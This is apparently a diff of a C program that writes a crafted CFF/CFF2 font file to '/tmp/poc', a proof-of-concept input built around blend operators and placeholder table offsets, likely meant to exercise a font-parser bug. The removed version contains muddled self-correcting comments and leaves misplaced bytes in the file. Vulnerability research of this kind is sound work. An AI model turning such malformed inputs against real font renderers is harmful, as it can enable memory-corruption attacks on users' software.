@@ -1,113 +1,78 @@
 #include <stdio.h>
-#include <stdlib.h>
 #include <stdint.h>
+#include <stdlib.h>
 
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
     if (!f) { perror("fopen"); return 1; }
 
-    /* CFF header */
-    fputc(0x01, f); fputc(0x00, f); fputc(0x04, f); fputc(0x01, f);
+    /* CFF2 header: major=2, minor=0, hdrSize=4, offSize=1 */
+    fputc(0x02, f); fputc(0x00, f); fputc(0x04, f); fputc(0x01, f);
 
-    /* Name INDEX (1 name "A") */
-    fputc(0x00, f); fputc(0x01, f); /* count = 1 */
-    fputc(0x01, f);                 /* offSize = 1 */
-    fputc(0x01, f);                 /* offset[0] = 1 */
-    fputc(0x02, f);                 /* offset[1] = 2 */
-    fputc(0x41, f);                 /* "A" */
+    /* Top DICT starts at offset 4 */
+    long top_start = ftell(f);
 
-    /* Top DICT INDEX */
-    fputc(0x00, f); fputc(0x01, f); /* count = 1 */
-    fputc(0x01, f);                 /* offSize = 1 */
-    fputc(0x01, f);                 /* offset[0] = 1 */
+    /* ROS: push 0, 1, 0, operator 0x0C 0x1E */
+    fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);
+    fputc(0x0C, f); fputc(0x1E, f);
 
-    long dict_data = ftell(f);
+    /* FDSelect placeholder: push offset, operator 0x0C 0x1B */
+    long fd_op_pos = ftell(f);
+    fputc(0x00, f); fputc(0x0C, f); fputc(0x1B, f);
 
-    /* MultipleMaster: num_axes=1, num_designs=2 */
-    fputc(0x8C, f); /* num_axes = 1 */
-    fputc(0x8D, f); /* num_designs = 2 */
-    fputc(12, f);   fputc(22, f);   /* opcode */
+    /* Private placeholder: push size, offset, operator 0x12 */
+    long priv_op_pos = ftell(f);
+    fputc(0x00, f); fputc(0x00, f); fputc(0x12, f);
 
-    /* charset (placeholder) */
-    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
-    fputc(15, f);                   /* charset */
+    /* CharStrings placeholder: 0x1C, 2-byte offset, 0x11 */
+    long char_op_pos = ftell(f);
+    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); fputc(0x11, f);
 
-    /* Private (placeholders) */
-    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* size */
-    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* offset */
-    fputc(18, f);                   /* Private */
-
-    long dict_end = ftell(f);
-    long dict_size = dict_end - dict_data;
-    fputc(1 + dict_size, f); /* offset[1] */
-
-    /* Empty String INDEX */
+    /* Global Subrs INDEX: count=0 */
     fputc(0x00, f); fputc(0x00, f);
 
-    /* Empty Global Subr INDEX */
-    fputc(0x00, f); fputc(0x00, f);
+    /* CharStrings INDEX */
+    long char_off = ftell(f);
+    fputc(0x00, f); fputc(0x01, f);
+    fputc(0x01, f);
+    fputc(0x01, f); fputc(0x02, f);
+    fputc(0x8B, f);
+
+    /* FDSelect table: Format 0 */
+    long fd_off = ftell(f);
+    fputc(0x00, f);              /* format = 0 */
+    fputc(0x00, f); fputc(0x01, f); /* nGlyphs = 1 */
+    fputc(0x00, f);              /* fds[0] = 0 */
 
     /* Private DICT */
-    long private_offset = ftell(f);
+    long priv_off = ftell(f);
+    fputc(0x00, f); fputc(0x0F, f); /* vsindex = 0 */
+    /* First blend */
+    fputc(0x01, f); fputc(0x02, f); fputc(0x03, f); fputc(0x04, f); fputc(0x05, f);
+    fputc(0x01, f); fputc(0x16, f);
+    /* Second blend */
+    fputc(0x06, f); fputc(0x07, f); fputc(0x08, f); fputc(0x09, f); fputc(0x0A, f);
+    fputc(0x01, f); fputc(0x16, f);
 
-    /* vsindex */
-    fputc(0x8B, f); /* push 0 */
-    fputc(15, f);   /* vsindex */
+    long priv_sz = ftell(f) - priv_off;
 
-    /* First blend: numBlends=20, base=0, 80 values (20*2*2) */
-    fputc(0x9F, f); /* push 20 (20+139=159=0x9F) */
-    fputc(0x8B, f); /* push 0 */
-    for (int i = 0; i < 80; i++) fputc(0x8B, f); /* zeros */
-    fputc(37, f);   /* blend */
+    /* Patch FDSelect operator */
+    fseek(f, fd_op_pos, SEEK_SET);
+    fputc((unsigned char)fd_off, f);
+    fputc(0x0C, f); fputc(0x1B, f);
 
-    /* Second blend: numBlends=20, base=20, 80 values */
-    fputc(0x9F, f); /* push 20 */
-    fputc(0x9F, f); /* push 20 */
-    for (int i = 0; i < 80; i++) fputc(0x8B, f); /* zeros */
-    fputc(37, f);   /* blend */
+    /* Patch Private operator */
+    fseek(f, priv_op_pos, SEEK_SET);
+    fputc((unsigned char)priv_sz, f);
+    fputc((unsigned char)priv_off, f);
+    fputc(0x12, f);
 
-    /* Third blend: numBlends=20, base=40, 80 values */
-    fputc(0x9F, f); /* push 20 */
-    fputc(0x9F, f); fputc(0x8B, f); fputc(0x8B, f); /* push 40 (2-byte encoding) */
-    /* Actually push 40 using 0x1C 0x00 0x28 */
-    /* Let me fix: push 40 = 0x1C 0x00 0x28 */
-    /* Wait, we already wrote 3 bytes. Let me redo this more carefully. */
-
-    /* I need to redo the third blend properly */
-    /* Seek back to after second blend */
-    long after_second = ftell(f);
-    /* We'll just write third blend correctly now */
-    fputc(0x9F, f); /* push 20 */
-    fputc(0x1C, f); fputc(0x00, f); fputc(0x28, f); /* push 40 */
-    for (int i = 0; i < 80; i++) fputc(0x8B, f); /* zeros */
-    fputc(37, f);   /* blend */
-
-    long private_end = ftell(f);
-    long private_size = private_end - private_offset;
-
-    /* CharStrings INDEX (1 glyph: endchar) */
-    long charstrings_offset = ftell(f);
-    fputc(0x00, f); fputc(0x01, f); /* count = 1 */
-    fputc(0x01, f);                 /* offSize = 1 */
-    fputc(0x01, f);                 /* offset[0] = 1 */
-    fputc(0x02, f);                 /* offset[1] = 2 */
-    fputc(14, f);                   /* endchar */
-
-    /* Patch Top DICT offsets */
-    fseek(f, dict_data + 4, SEEK_SET);
+    /* Patch CharStrings operator */
+    fseek(f, char_op_pos, SEEK_SET);
     fputc(0x1C, f);
-    fputc((charstrings_offset >> 8) & 0xFF, f);
-    fputc(charstrings_offset & 0xFF, f);
-
-    fseek(f, dict_data + 8, SEEK_SET);
-    fputc(0x1C, f);
-    fputc((private_size >> 8) & 0xFF, f);
-    fputc(private_size & 0xFF, f);
-
-    fseek(f, dict_data + 11, SEEK_SET);
-    fputc(0x1C, f);
-    fputc((private_offset >> 8) & 0xFF, f);
-    fputc(private_offset & 0xFF, f);
+    fputc((unsigned char)(char_off >> 8), f);
+    fputc((unsigned char)(char_off & 0xFF), f);
+    fputc(0x11, f);
 
     fclose(f);
     return 0;
